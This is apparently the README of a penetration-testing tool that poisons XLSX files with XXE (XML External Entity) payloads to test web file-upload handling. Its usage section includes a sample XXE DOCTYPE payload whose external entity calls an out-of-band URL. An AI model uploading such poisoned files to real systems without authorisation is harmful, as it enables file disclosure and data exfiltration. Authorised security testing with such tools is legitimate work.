# XXElixir 🧪
This tool is designed to test for file upload and XXE (XML External Entity) vulnerabilities by poisoning an XLSX file. It allows the user to inject custom XML content or specify an out-of-band URL to retrieve data from an external entity. The tool works by unzipping the input XLSX file, modifying the workbook.xml file to include the user-specified XML content or URL, and then zipping the modified directory back into a new XLSX file. The resulting file can be used to test for file upload and XXE vulnerabilities in web applications that accept XLSX files.


## Usage 🛠 

Poison .XLSX file ☣️
```
python3 --file test.xlsx --xxe "<\!DOCTYPE ShiftSecurityConsulting [ <\!ENTITY xxe SYSTEM 'http://out-of-band.url'> ]>" --output poisoned.xlsx
```
```
python3 --file test.xlsx --url https://shiftsecurityconsulting.com --output poisoned.xlsx
```

## Running from Docker 🐳

Build
```
docker build -t xxelixir .
```

Run
```
docker run -v $(pwd)/data:/data -ti xxelixir -f data/test.xlsx -u https://shiftsecurityconsulting.com -o /data/poisoned.xlsx
```


## Parameters 🧰 

Parameter | Description | Type
------------ | ------------- | -------------
--url / -u | The URL for out of band testing | String
--file / -f | Input XLSX file | File
--output / -o | Output file | File
--xxe |Custom XXE injection string | String

## Contact Me 📇

[LinkedIn - Milan Jovic](https://www.linkedin.com/in/milan-jovic-sec/)

[Shift Security Consulting - Secure Your Digital Future](https://shiftsecurityconsulting.com)

[Twitter - Milan Jovic](https://twitter.com/milanshiftsec)

#### Educational purposes only and cannot be used for law violation or personal gain.
#### The author of this project is not responsible for any possible harm caused by the materials of this project.
